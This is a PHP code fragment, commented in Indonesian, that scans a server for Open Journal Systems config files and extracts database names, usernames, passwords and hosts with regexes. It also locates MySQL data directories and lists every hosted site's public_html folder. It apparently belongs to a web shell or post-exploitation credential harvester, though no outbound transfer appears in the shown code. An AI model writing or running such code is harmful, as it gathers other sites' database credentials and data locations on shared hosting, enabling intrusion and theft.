// Cari file config OJS
function findOJSConfig() {
    $search_dirs = [
        $_SERVER['DOCUMENT_ROOT'],
        dirname($_SERVER['DOCUMENT_ROOT']),
        getcwd(),
        '/home',
        '/var/www'
    ];
    
    foreach ($search_dirs as $dir) {
        if (!is_dir($dir)) continue;
        
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS)
        );
        
        foreach ($iterator as $file) {
            if ($file->getFilename() === 'config.inc.php') {
                return $file->getPathname();
            }
        }
    }
    return null;
}

// Baca info database dari config
function getDBInfo($config_path) {
    if (!$config_path || !file_exists($config_path)) return null;
    
    $content = @file_get_contents($config_path);
    if (!$content) return null;
    
    $info = [];
    if (preg_match('/name\s*=\s*"([^"]+)"/', $content, $m)) $info['db_name'] = $m[1];
    if (preg_match('/username\s*=\s*"([^"]+)"/', $content, $m)) $info['db_user'] = $m[1];
    if (preg_match('/password\s*=\s*"([^"]+)"/', $content, $m)) $info['db_pass'] = $m[1];
    if (preg_match('/host\s*=\s*"([^"]+)"/', $content, $m)) $info['db_host'] = $m[1];
    
    return $info;
}

// Cari lokasi fisik database MySQL
function findMySQLDataLocation($db_name = null) {
    $mysql_dirs = [
        '/var/lib/mysql',
        '/var/lib/mysql-files',
        '/usr/local/mysql/data'
    ];
    
    foreach ($mysql_dirs as $dir) {
        if (is_dir($dir)) {
            if ($db_name && is_dir($dir . '/' . $db_name)) {
                return $dir . '/' . $db_name;
            }
            return $dir;
        }
    }
    return null;
}

// Cari semua folder website
function findWebsiteFolders() {
    $folders = [];
    
    $search = [
        '/home/*/public_html',
        '/var/www/*/public_html',
        '/var/www/html'
    ];
    
    foreach ($search as $pattern) {
        $dirs = glob($pattern, GLOB_ONLYDIR);
        foreach ($dirs as $dir) {
            $folders[] = $dir;
        }
    }
    
    return $folders;
}
